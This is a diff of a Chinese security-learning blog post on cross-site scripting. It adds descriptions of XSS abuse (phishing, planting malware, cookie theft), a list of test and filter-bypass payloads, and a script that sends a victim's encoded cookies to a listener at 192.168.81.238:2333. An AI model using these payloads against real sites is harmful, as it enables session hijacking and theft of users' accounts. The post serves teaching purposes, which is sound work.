@@ -23,6 +23,7 @@
 <meta property="og:site_name" content="AU9U5T">
 <meta property="og:description" content="漏洞简绍跨站脚本攻击XSS(Cross Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS攻击针对的是用户层面的攻击！ 前端基础js可以在网页上实现任何功">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20240501205320595.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/XSS/image-20231201202831226.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231207234608819.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231207234837426.png">
@@ -38,11 +39,11 @@
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231203204136766.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231203204249856.png">
 <meta property="article:published_time" content="2023-12-01T12:22:37.000Z">
-<meta property="article:modified_time" content="2024-05-01T09:37:24.956Z">
+<meta property="article:modified_time" content="2024-05-01T13:15:19.633Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="基础漏洞">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/XSS/image-20231201202831226.png">
+<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20240501205320595.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -242,7 +243,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          7.7k words
+          9k words
         
       </span>
     
@@ -253,7 +254,7 @@
         
         
         
-          65 mins
+          75 mins
         
       </span>
     
@@ -330,17 +331,36 @@
 <ol>
 <li><p>钓鱼欺骗</p>
 <p>制作与正常的服务相类似的网站镜像，然后诱导受害者去点击，输入密码，然后我方进行调用</p>
+<blockquote>
+<p>最典型的就是利用目标网站的反射型跨站脚本漏洞将目标网站重定向到钓鱼网站，或者注入钓鱼 JavaScript 以监控目标网站的表单输入，甚至发起基于 DHTML[^dhtml] 更高级的钓鱼攻击方式。</p>
+</blockquote>
 </li>
 <li><p>网站挂马</p>
+<blockquote>
+<p>跨站时利用 IFrame[^IFrame ] 嵌入隐藏的恶意网站或者将被攻击者定向到恶意网站上，或者弹出恶意网站窗口等方式都可以进行挂马攻击。</p>
+</blockquote>
+<p>可以简单是实现为使用msf 或者cs 的web 攻击，然后添加到网站的根目录或者访问量较大的部分，访问这个页面的时候自动请求payload 使其上线</p>
 </li>
 <li><p>身份盗用</p>
 <p>就是窃取cookie</p>
+<blockquote>
+<p>Cookie 是用户对于特定网站的身份验证标志，XSS 可以盗取到用户的 Cookie，从而利用该 Cookie 盗取用户对该网站的操作权限。如果一个网站管理员用户 Cookie 被窃取，将会对网站引发巨大的危害。</p>
+</blockquote>
 </li>
 <li><p>盗取用户的信息</p>
+<blockquote>
+<p> 当能够窃取到用户 Cookie 从而获取到用户身份使，攻击者可以获取到用户对网站的操作权限，从而查看用户隐私信息。</p>
+</blockquote>
 </li>
 <li><p>垃圾信息发送</p>
+<blockquote>
+<p>比如在 SNS 社区中，利用 XSS 漏洞借用被攻击者的身份发送大量的垃圾信息给特定的目标群。</p>
+</blockquote>
 </li>
 <li><p>劫持用户的web行为</p>
+<blockquote>
+<p>一些高级的 XSS 攻击甚至可以劫持用户的 Web 行为，监视用户的浏览历史，发送与接收的数据等等。</p>
+</blockquote>
 </li>
 <li><p>XSS蠕虫</p>
 <p>利用csrf 和xss </p>
@@ -353,6 +373,8 @@
 <p>己经获取了web 权限如果发现可以在登陆页面插入xss 代码，然后每一个登陆的时候将会发送请求，从而记录密码</p>
 </li>
 </ol>
+<p>下面是整个的逻辑</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20240501205320595.png" srcset="/img/loading.gif" lazyload alt="image-20240501205320595"></p>
 <h1 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h1><h2 id="反射性XSS"><a href="#反射性XSS" class="headerlink" title="反射性XSS"></a>反射性XSS</h2><p>又称为非持久性XSS，这种攻击往往具有一次性</p>
 <p>如果使用，这个需要调用使用社工，钓鱼</p>
 <p>可以使用弹窗发现</p>
@@ -360,8 +382,8 @@
 <h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>又称为持久性XSS，攻击脚本基本储存在咪表的服务器当中，更具有隐蔽性。</p>
 <p>这种多用于博客，论坛，留言板当中，在发帖的过程中嵌入XSS攻击代码，帖子被目标服务器存储在数据库当中，当用户进行正常的额访问时，触发XSS代码</p>
 <h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p>可以理解为不经过后端只在前端执行的代码</p>
-<h1 id="盗用cookie"><a href="#盗用cookie" class="headerlink" title="盗用cookie"></a>盗用cookie</h1><h2 id="cookile简绍"><a href="#cookile简绍" class="headerlink" title="cookile简绍"></a>cookile简绍</h2><p>Cookie是HTTP协议下，服务器可以维护客户工作站上信息的一种方式。cookie是由web服务器保存在用户的客户端上的小文本文件，它可以包含多种信息</p>
-<h2 id="提前"><a href="#提前" class="headerlink" title="提前"></a>提前</h2><ol>
+<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="盗用cookie"><a href="#盗用cookie" class="headerlink" title="盗用cookie"></a>盗用cookie</h1><h2 id="cookile简绍"><a href="#cookile简绍" class="headerlink" title="cookile简绍"></a>cookile简绍</h2><p>Cookie是HTTP协议下，服务器可以维护客户工作站上信息的一种方式。cookie是由web服务器保存在用户的客户端上的小文本文件，它可以包含多种信息</p>
+<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><ol>
 <li><p>没有httponly</p>
 </li>
 <li><p>受害者可以直接访问到接收端</p>
@@ -478,6 +500,10 @@
 
 
 
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;input onfocus=<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;xss&#x27;</span>) autofocus&gt; <br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;)&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;) &gt;</span> </span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> </span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>clickme<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> </span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(123456)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> </span><br><span class="language-xml">&#x27;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(123456)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> </span><br><span class="language-xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(123456)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> </span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(123456)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span> <br>&lt;scrip&lt;script&gt;t&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-number">123456</span>)&lt;<span class="hljs-regexp">/scrip&lt;/</span>script&gt;t&gt; <br>&lt;<span class="hljs-regexp">/div&gt;&lt;script&gt;alert(123456)&lt;/</span>script&gt;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;http://192.168.81.238:2333/?q=&#x27;</span>+<span class="hljs-title function_">btoa</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)) </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
 
 
 <h1 id="XSS插入位置"><a href="#XSS插入位置" class="headerlink" title="XSS插入位置"></a>XSS插入位置</h1><ul>
@@ -553,7 +579,11 @@
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">1</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>这个需要在F12，开启调试之后才能发现，可以理解为调试的结果，日志输出</p>
+<h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_50854790/article/details/124297046">XSS攻击绕过过滤方法大全（转）_xss绕过-CSDN博客</a></p>
+</blockquote>
 <p>[^html编码]: HTML编码是一种将特殊字符转换为HTML实体的过程。在HTML中，有一些特殊字符具有特殊的含义，比如小于号（&lt;）、大于号（&gt;）、引号（”）、和符号（&amp;）等。如果直接在HTML中使用这些字符，有时会导致解析错误或显示不正常。因此，需要使用HTML编码将这些特殊字符转换为对应的实体或代码。将小于号（&lt;）编码为 <code>&amp;lt</code>，将大于号（&gt;）编码为 <code>&amp;gt</code>，将引号（”）编码为 <code>&amp;quot</code>，将和符号（&amp;）编码为 <code>&amp;amp</code> 等。</p>
+<p>[^IFrame ]: 可以理解是html 的标签<br>[^ dhtml]: DHTML 是一种使 HTML 页面具有动态特性的艺术。</p>
 
                 
               </div>
